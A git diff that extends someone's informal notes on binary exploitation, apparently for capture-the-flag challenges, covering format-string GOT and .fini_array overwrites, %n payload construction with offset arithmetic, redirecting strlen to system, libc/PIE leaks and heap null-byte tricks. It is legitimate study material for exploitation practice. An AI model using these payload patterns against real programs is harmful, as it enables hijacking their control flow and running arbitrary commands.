@@ -186,7 +186,9 @@ payload += p32(elf.got["puts"])
 we can pass our payload from binary using ./target | ./payload
 
 write address of target function to got of called function to make the target function called
-find got entry from function objdump -R 32_new | grep fflush
+find got entry from function 
+
+objdump -R 32_new | grep fflush
 knowing value for n byte written in target got : break after printf function then view value written in got address , x/2w got_address
 got = 0804a028
 value on got = 0x8704870b
@@ -194,5 +196,88 @@ value on got = 0x8704870b
 0804a029 = 0x87
 and etc
 
-if flag loaded in memory we can leak it using printf
+if flag loaded in memory we can leak it using printf , %1$s . Using try catch to make a loop using that payload
 
+write value to memory using printf
+address = p32(fflush_got)
+address += p32(fflush_got+1)
+address += p32(fflush_got+2)
+address += p32(fflush_got+3)
+payload = address
+payload += "%181x%10$n"
+payload += "%124x%11$n"
+payload += "%125x%12$n"
+payload += "%260x%13$n"
+
+%10 because when inputing AAAA.%x.%x , the value of AAAA in index 10 ( AAAA.8048914.ffcc7748.f7f32d50.f7f32400.f7f44e56.1.ffcc79f4.f7b4e2cc.39c.41414141 )
+then we need to take a look on fflush_got value after first rewrite . After that adjust value to make it fit the target. Or we can check the value first x/x fflush_got/
+
+
+if our input doesn't fit in output ( AAAA.80487d0.ffcf9dec.0.0.0.0.6563694e.206f7420.7465656d.756f7920.4141202c.252e4141.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825 ) . We need to do padding  ( BBAAAA.80487d0.ffb0450c.0.0.0.0.6563694e.206f7420.7465656d.756f7920.4242202c.41414141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e )
+
+Since RELRO isn't enabled, we can write to the GOT table (the GOT Table is a table of addresses in the binary that hold libc address functions), and since PIE isn't enabled we know the addresses of the GOT table.
+
+objdump -D greeting | grep system
+
+bypass stack chk fail : .fini_array -> contains an array of functions which are executed sometime after main returns . Find fini array using info file. then we can make return to the address we want after main function executed
+
+We can overwrite strlen with system, because it is using same argument that is char and it is one of the best choice if there is no call to strlen in another function
+
+strlen@GLIBC_2.0 == strlen@got.plt
+
+overwrite got to target function or target plt
+
+fini_array = 0x08049934
+target = 0x08048614
+
+fini_array -> 8614 -> %12$n
+fini_array+2 -> 0804 -> %13$n
+
+we can use payload like below if we need to overwrite %13 and %15 with same value
+payload += "%33652x%13$n"
+payload += "%15$n"
+
+function that use string as argument ( we can overwrite it with system ) :
+- atoi
+- strlen
+- strtok
+
+32 bit , if we want to know value printed by %x in printf . break at printf call , then look at the $esp+0x4
+value saved in executable can be used to leak PIE , substract the value with executable value in vmmap to know the offset
+value saved in libc can be used to leak LIBC base , substract the value with libc value in vmmap to know the offset
+
+patching dynamic loader to elf
+patchelf --set-interpreter /tmp/ld-2.27.so ./test
+LD_PRELOAD=./libc-2.27.so ./test
+(gdb) set environment LD_PRELOAD ./libc-2.27.so
+
+search-pattern our_input // to know where is our input stored
+
+malloc automates allocating address next to the heap address generated before ( allocate additional heap chunks )
+fgets(20) = store 19 byte input
+fgets(18) = store 17 byte input
+strtok(address,'\n') = replace newline with null byte
+if we input 16 byte payload , so there is \n in byte 17, then it will be replaced by null byte then in byte 18 because it is fgets byte 18 will be null byte , so inputting 16 byte value will make two null bytes in the end of our input.
+
+case ( fgets -> null byte in end and strtok )
+malloc(4) = 3 byte input , 1 byte header?
+heap alloc for index - 0 16 byte 
+heap alloc for index - 1 16 byte
+we can overwrite value for heap alloc index - 0 to merge it value with heap alloc index - 1 , example by overwrite it value with 16 byte payload then overwrite the null byte in index - 1 by overwrite heap index - 1
+
+calculate printformat position
+look at $esp at call printf
+0xffffd020│+0x0000: 0xffffd06c -> our input
+0xffffd024│+0x0004:
+so the position is 0xffffd06c-0xffffd024 = 72 . 72/4 ( because of 4 bytes ) = 18 . so the position is 18+1 = 19
+
+# Calculate the amount of bytes we need to print for the fmt string write
+x = (system & 0xffff) - 8 // 8 because there is 8 byte before this
+y = ((system & 0xffff0000) >> 16) - (system & 0xffff) // (system & 0xffff) because there is (system & 0xffff) bytes before this
+
+noop[0:17] + noop[16:] -> because last byte in noop[0:17] will be null byte , so value in index 16 must be send again
+
+if we cannot recvuntil(stuck) try to send it without recvuntil 
+to check value of pie and libc base, gdb.attach(r) then vmmap then continue
+
+knowing got value of address , x/x address.
